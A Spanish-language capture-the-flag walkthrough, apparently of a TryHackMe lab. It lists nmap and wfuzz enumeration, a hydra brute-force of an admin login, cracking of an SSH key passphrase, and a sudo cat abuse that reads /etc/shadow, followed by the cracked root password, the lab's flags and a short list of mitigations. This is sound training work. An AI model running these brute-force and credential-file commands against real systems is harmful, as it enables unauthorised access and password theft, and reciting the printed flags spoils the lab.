# BRUTE-IT

#### FASE RECOPILACIÓN
* Escaneo:
    * `nmap -v -n --open -sV -sV --min-rate 5000 -Pn <IP>`
		
* Enumeración:
	* Web:
		* Dirs:
  			* `wfuzz -c --hc 400,403,404 --hh 275 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -R 3 -u "http://[IP]/FUZZ"`
				* /admin	
			
		* Recursos:
  			* `wfuzz -c --hc 400,403,404 --hh 275 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -u "http://[IP]/admin/FUZZ"`
				* /admin/index.php
				* /admin/styles.cs
				* /admin/.zip
			
		* Credenciales:
			* john:
			* admin:xavier
		
		* Web Flag:
			* THM{brut3_f0rce_is_e4sy}
___		 
	
#### FASE EXPLOTACIÓN

* Web:
    * `hydra -l admin -P ../rockyou.txt [IP] http-post-form "/admin/index.php:user=admin&pass=^PASS^:Username or password invalid" -v -t 64`
        * admin:xavier
		
* Sistema:
    * `curl -O http://10.48.174.154/admin/panel/id_rsa`
    * john
        * `ssh2john id_rsa > id_rsa.hash`
        * `john --wordlist=<rockyou.txt> id_rsa.hash`
        * `id_rsa:rockinroll`
        * `(john --show id_rsa.hash)`
				
    * `ssh -i id_rsa john@[IP]`
    * `whoami` ==> john

___

#### FASE POST-EXPLOTACIÓN (Escalar Privilegios):
* User Flag:
    * `cat user.txt`
        * THM{a_password_is_not_a_barrier}
* sudo -l
    * (root) NOPASSWD: /bin/cat
        * GTFO Bins
            * `sudo -u root /bin/cat /etc/shadow`
                * `root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.`
                * IA ==> SHA512
                * nano shadow.txt
                    * `root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::`
                * `john -wordlist=[rockyou.txt] shadow.txt`
                    * `root:football`
                    * (john --show shadow.txt)
                - Root Flag:
                	- `cat root.txt`
                    	- THM{pr1v1l3g3_3sc4l4t10n}

___

#### MITIGACIONES
1. No dejar claves/archivos sensibles dentro de la webapp
2. No dar permisos elevados a usuarios regulares salvo que sea estrictamente necesario
3. Verificar que los binarios no tengan vulnerabilidades conocidas
4. No usar passwords débiles
